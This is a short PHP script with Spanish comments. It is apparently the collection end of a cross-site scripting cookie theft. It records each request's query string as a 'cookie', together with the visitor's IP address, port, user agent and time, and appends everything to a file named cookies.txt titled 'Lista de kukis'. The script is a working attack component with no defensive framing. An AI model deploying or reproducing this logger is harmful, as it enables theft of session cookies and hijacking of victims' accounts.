<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<?php 

    

    $nombre_archivo = "cookies.txt"; 
   
    $galleta =  $_SERVER['QUERY_STRING']; //obtiene todo lo que viene despues del signo ?
    $ip = $_SERVER['REMOTE_ADDR'];
    $port = $_SERVER["REMOTE_PORT"];
    $cliente = apache_request_headers()['User-Agent'];
    $fecha_y_hora = date("Y-m-d H:i:s");


    $contenido = $fecha_y_hora." - ".$cliente."  -  ".$ip.":".$port."  -  ".$galleta;

    if(file_exists($nombre_archivo))
    {
        $mensaje = file_get_contents($nombre_archivo)."\r\n".$contenido;
    }     
    else
    {
        $mensaje = "Lista de kukis"."\r\n".$contenido;
    }
    
 
    if($archivo = fopen($nombre_archivo, "w+"))
    {
        if(fwrite($archivo,$mensaje."\r\n"))
        {
            echo "Se ha ejecutado correctamente";
        }
        else
        {
            echo "Ha habido un problema al crear el archivo";
        }
 
        fclose($archivo);
    }
 